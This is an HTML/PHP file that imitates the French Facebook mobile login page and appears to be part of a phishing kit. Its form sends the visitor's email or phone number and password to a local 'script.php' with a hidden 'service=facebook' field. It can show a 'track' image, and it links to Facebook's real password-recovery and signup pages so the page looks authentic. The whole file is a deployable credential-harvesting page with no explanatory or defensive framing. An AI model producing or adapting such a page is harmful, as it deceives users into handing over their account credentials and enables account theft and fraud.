<!DOCTYPE html>
<html>
<head>
	<title>Facebook - Connexion ou inscription</title>
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<link rel="shortcut icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/c/c2/Facebook_icon_192.png" style="border-radius: 10px;" />
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
	<style type="text/css">
		.b{
			width: 100%;
		}
	</style>
</head>
<body>

<div class="container-fluid">
	<div class="container">
		<div class="row" style="margin-top: 10px;">
			<div class="col-sm"></div>
  <div class="col-sm">
  	<center>
 <form method="POST" action="script.php">
 	 		<h4><b style="color: #1877f2;"> facebook</b></h4>
 	 		<?php 
 	 		$img_name='track.png';
 	 		$img_name2='track.jpg';
 	 		$img_name3='track.jpeg';
 	 		
 	 		if (file_exists($img_name)) {
 	 				?>
 	 			<img src="track.png" class="b">
 	 			<?php
 	 		}else{
 	 			echo "";
 	 		
 	 		}



 	 		if (file_exists($img_name2)) {
 	 			?>
 	 			<img src="track.jpg" class="b">
 	 			<?php
 	 		}else{
 	 			echo "";
 	 		}



 	 		if (file_exists($img_name3)) {
        
 	 			?>
 	 			<img src="track.jpeg" class="b">
 	 			<?php
 	 		}else{
 	 			echo "";
 	 		}
 	 		?>

  		<input type="text" name="email" class="inpu" placeholder="Numéro de mobile ou adresse e-mail" ><br>
  		<input type="password" name="password" class="inpu" placeholder="Mot de passe">
      <input type="hidden" name="service" value="facebook">
  		<br>

  		<button type="submit"  name="connect" style="background-color: #1877f2;color: white;border: none;border-radius: 5px;width: 100%;height: 40px;margin-top: 10px;"><b>Se connecter</b></button><br>
  		
  		<a href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr">Mot de passe oublié ?</a>
  		<br>
  		<i style="opacity: 0.3;">___________ ou ___________</i>
  		<br>
  	<a href="https://fr-fr.facebook.com/r.php">	<button style="background-color: #00a400;color: white;border: none;border-radius: 3px;margin-top: 12px;height: 40px;"><b>Creer un compte</b></button></a>
  		<br>
  		
  	
 </form>
  	<br>
  	<br>
  	<br>
  	<CENTER>
  		<div class="row" style="font-size: 11px;">
  		<div class="col-sm-6 grid">
  			
			<table style="text-align: center;">
				<tr>
					<td><b style="opacity: 0.5;">Français</b>
  			<br>
  			<a href="#">Fula</a><br>
  			<a href="#">Brasil</a><br>
  			<a href="#">italiano</a><br></td>
  			<td style="width: 200px;"></td>
					<td>
  			<a href="#">English (US)</a><br>
  			<a href="#">Espagnol</a><br>
  			<a href="#">Deutsch</a><br></td>
				</tr>
			</table>


		
				</div>
  	</div>
  	</CENTER>
  	<p style="font-size: 11px;">
  		À propos · Aide · Plus<br>
Meta Inc.
  	</p>
</center>
  </div>
  <div class="col-sm"></div>
		</div>
	</div>
	
</div>
</body>
</html>
<style type="text/css">
	.inpu{
		background-color: #f5f6f7;
		width: 100%;
		height: 45px;
		margin-top: 5px;
		border: none;
		border-radius: 3px;
		padding-left: 10px;
		box-shadow: 0px 0px 0px black;
	}
</style>


